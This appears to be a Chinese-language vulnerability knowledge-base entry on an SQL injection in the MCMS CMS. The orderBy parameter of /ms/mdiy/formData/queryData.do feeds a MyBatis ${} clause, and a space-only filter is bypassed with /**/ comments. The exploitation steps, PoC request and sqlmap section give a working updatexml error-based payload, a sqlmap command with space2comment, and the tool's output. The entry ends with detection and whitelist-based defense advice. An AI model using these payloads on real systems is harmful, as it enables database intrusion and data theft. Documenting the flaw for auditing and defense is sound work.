---
id: web-generic-sqli-mcms-formdata-querydata-orderby
title: MCMS /ms/mdiy/formData/queryData.do orderBy 参数 Mybatis ${} 注入（空格过滤可绕过）
type: scenario
domain: web
path: web/generic/sqli
technique: mybatis-orderby-sql-injection
tags:
- java
- mybatis
- sql-injection
- error-based
- mcms
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-33
  verified_at: '2026-11-08T16:57:36+08:00'
  notes: 已对照原文核对：queryData接口orderBy含空格即拒检查代码、sqlmap space2comment error-based UPDATEXML注入成功证据齐全；dedup_review理由成立（与dict/listExcludeApp接口不同、过滤不同）
url: /docs/web/generic/sqli/web-generic-sqli-mcms-formdata-querydata-orderby/
draft: false
kb_aliases:
- MCMS queryData SQL 注入
- MCMS formData orderBy 注入
---

## 一句话结论

MCMS 自定义表单查询接口 /ms/mdiy/formData/queryData.do 的 orderBy 参数拼入 ms-base 的 IBaseDao.xml `order by ${orderBy}`，仅校验"含空格即拒绝"，用内联注释替代空格即可绕过并实现 MySQL 报错注入。

## 原理

ms-base-2.1.13 的 IBaseDao.xml 中 `order by ${orderBy}` 使用 ${} 字符串拼接；ModelDataImpl.queryDiyFormData 在调用前仅做 `orderBy.contains(" ")` 检查，未过滤其他字符。order by 位置无法使用 union，但可用报错注入（updatexml/extractvalue）或布尔盲注取数；空格用 `/**/` 内联注释替代即可绕过检查。FormDataAction.queryData（GET/POST 均可）把请求参数透传给 queryDiyFormData，因此外部可控。

## 触发条件

- 可访问 /ms/mdiy/formData/queryData.do（原文 PoC 携带管理员登录 Cookie，实际需后台会话或该接口未鉴权时可达）；
- modelId 对应的自定义模型存在且 queryBySQL 走 orderBy 可控的重载。

## 利用步骤

1. 构造请求 `POST /ms/mdiy/formData/queryData.do`，body `modelId=1&orderBy=1`，确认接口正常返回 JSON；
2. 将 orderBy 值替换为报错注入 payload，空格全部用 `/**/` 替代，如 `1/**/and/**/updatexml(1,concat(0x7e,(select/**/database())),1)`；
3. 使用 sqlmap：`sqlmap.py -r a.txt --tamper space2comment --risk 3 --level 5 --dbs --hex`（请求文件中将 orderBy 值加 * 标记自定义注入点）；
4. sqlmap 确认 MySQL >= 5.1 error-based（Parameter replace (UPDATEXML)），可继续枚举数据库。

## PoC

```
POST /ms/mdiy/formData/queryData.do HTTP/1.1
Host: 192.168.204.137:8080
Content-Type: application/x-www-form-urlencoded

modelId=1&orderBy=*
```

`sqlmap.py -r a.txt --tamper space2comment --risk 3 --level 5 --dbs --hex`
sqlmap 结果：Type: error-based，Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)，Payload: `modelId=1&orderBy=(UPDATEXML(6390,CONCAT(0x2e,0x7171717171,(SELECT (ELT(6390=6390,1))),0x7171716271),6678))`，后端 MySQL >= 5.1。

## 变体与关联

- 同一 IBaseDao.xml 中 begin/end、order 等其他 ${} 点在向上回溯后无可控调用点或同样过滤，未打通；
- 同类 CMS 源码审计中，Mybatis ${} 注入点应沿 dao xml → 接口 → biz 实现 → action 四层回溯确认入参可控性。

## 检测与防御

- 检测：对 /queryData.do 的 orderBy 参数特征（updatexml、extractvalue、/**/）告警。
- 防御：orderBy 使用白名单映射到固定列名；Mybatis 中 order by 场景改用 <choose> 枚举而非 ${} 拼接。
